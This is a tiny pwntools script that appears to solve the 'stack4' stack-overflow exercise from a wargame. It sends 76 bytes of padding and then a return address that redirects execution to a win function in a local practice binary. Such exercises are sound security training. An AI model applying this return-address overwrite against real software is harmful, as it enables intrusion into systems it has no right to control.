from pwn import *

context.log_level = 'debug'

f = 'stack4'
p = process('../problems/' + f)
b = ELF('../problems/' + f)

padding = 'A'*76
win = p32(0x80483f4)
payload = padding + win

p.sendline(payload)

p.recv()
